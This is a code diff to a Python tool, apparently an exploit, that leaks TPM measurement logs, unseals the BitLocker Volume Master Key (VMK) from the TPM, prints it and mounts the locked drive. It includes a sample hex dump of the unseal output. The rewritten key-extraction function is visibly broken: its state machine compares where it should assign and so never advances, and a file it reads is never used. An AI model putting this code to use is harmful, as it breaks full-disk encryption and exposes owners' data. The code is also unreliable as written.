@@ -575,9 +575,43 @@ class TPMInterface(Display):
         f.close()
         sleep(2)
 
+
+        data = open('unseal-out.bin','rb').read()
         # Extract VMK from TPM result
-        #vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
-        #return vmk_data
+        vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
+        return vmk_data
+
+    #
+    # Extract VMK from TPM result
+    #
+    def extract_vmk_from_tpm_result(self, tpm_output):
+        """
+        [>>] Execute TPM2_Unseal... Input file tpm2_unseal.bin
+    Initializing Local Device TCTI Interface
+        [>>] Input Size 27
+    00000000  80 02 00 00 00 1b 00 00  01 5e 80 00 00 01 00 00  |.........^......|
+    00000010  00 09 03 00 00 00 00 00  00 00 00                 |...........|
+
+        [>>] Output Size 97, Result: Success
+    00000000  80 02 00 00 00 61 00 00  00 00 00 00 00 2e 00 2c  |.....a.........,|
+    00000010  2c 00 05 00 01 00 00 00  03 20 00 00 88 2e b7 28  |,........ .....(|
+    00000020  33 cd 21 05 f5 38 ea 60  89 51 62 e8 61 5b 0c ed  |3.!..8.`.Qb.a[..|
+    00000030  6a 63 7e f9 17 83 55 e9  0f 70 95 09 00 20 df e3  |jc~...U..p... ..|
+    00000040  75 69 1f e8 30 33 ef 3f  10 49 e3 53 de 18 e4 f1  |ui..03.?.I.S....|
+    00000050  0c e2 18 dd 7c bf ab 1d  6d 63 38 ec d1 f3 00 00  |....|...mc8.....|
+    00000060  00                                                |.|
+    Success
+        """
+        vmk_data = []
+        state = 0
+        for c in tpm_output:
+            if state==4 and len(vmk_data) < 0x20: vmk_data.append(c)
+            if state==3 and c == 0x00: state == 4
+            if state==2 and c == 0x00: state == 3
+            if state==1 and c == 0x20: state == 2
+            if state==0 and c == 0x03: state == 1
+            
+        return vmk_data
 
 # 
 # Extract TPM encoded blob from Dislocker tool
@@ -626,58 +660,10 @@ def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
     return raw_data
 
 #
-# Extract VMK from TPM result
-#
-def extract_vmk_from_tpm_result(tpm_output):
-    """
-    [>>] Execute TPM2_Unseal... Input file tpm2_unseal.bin
-Initializing Local Device TCTI Interface
-    [>>] Input Size 27
-00000000  80 02 00 00 00 1b 00 00  01 5e 80 00 00 01 00 00  |.........^......|
-00000010  00 09 03 00 00 00 00 00  00 00 00                 |...........|
-
-    [>>] Output Size 97, Result: Success
-00000000  80 02 00 00 00 61 00 00  00 00 00 00 00 2e 00 2c  |.....a.........,|
-00000010  2c 00 05 00 01 00 00 00  03 20 00 00 88 2e b7 28  |,........ .....(|
-00000020  33 cd 21 05 f5 38 ea 60  89 51 62 e8 61 5b 0c ed  |3.!..8.`.Qb.a[..|
-00000030  6a 63 7e f9 17 83 55 e9  0f 70 95 09 00 20 df e3  |jc~...U..p... ..|
-00000040  75 69 1f e8 30 33 ef 3f  10 49 e3 53 de 18 e4 f1  |ui..03.?.I.S....|
-00000050  0c e2 18 dd 7c bf ab 1d  6d 63 38 ec d1 f3 00 00  |....|...mc8.....|
-00000060  00                                                |.|
-Success
-    """
-    output_found = 0
-    vmk_data = []
-    for line in tpm_output:
-        if 'Output Size' in line:
-            output_found = 1
-            continue
-
-            if not 'Success' in line:
-                return []
-
-        if output_found == 1 and not '0000' in line:
-            break
-       
-        if output_found == 1:
-            data = line.split('|')
-            data = data[0].split()
-            vmk_data = vmk_data + data[1:17]
-
-    vmk_data = [int(vmk_data[i], 16) for i in range(28, 60)]
-    return vmk_data
-
-#
 # Mount BitLocker-locked partition with the VMK
 #
 def mount_bitlocker_partition_with_vmk(drive_path, vmk_data):
     info_print('Mount BitLocker-locked Partition with VMK.\n')
-
-    # Print VMK
-    color_print('    [>>] VMK = ', GREEN)
-    for hex in vmk_data:
-        color_print('%02X'% hex, GREEN)
-    info_print('\n')
 
     # Prepare TPM2_Load data
     info_print('    [>>] Create VMK data... ')
@@ -711,7 +697,6 @@ if __name__ == '__main__':
     #       data use.
     #
     exploit.leak()
-    #exploit.start_tpm()
     exploit.process_pcr_logs()
 
     tpm     = TPMInterface(exploit.logs(),type=exploit.type())
@@ -721,6 +706,10 @@ if __name__ == '__main__':
     ##f = open(filename,'wb')
     tpm.prepare_tpm_data(exploit.bitlocker_path())
     vmk_data = tpm.execute_tpm_cmd_and_extract_vmk()
+    vmk_key = ''.join('{:02x}'.format(x) for x in vmk_data)
+    # Print VMK
+    color_print('[>>>>>] VMK = '+vmk_key, GREEN)
+    info_print('\n')
 
     ##f.write(hexlify(bytearray(vmk_data)))
     ##f.close()
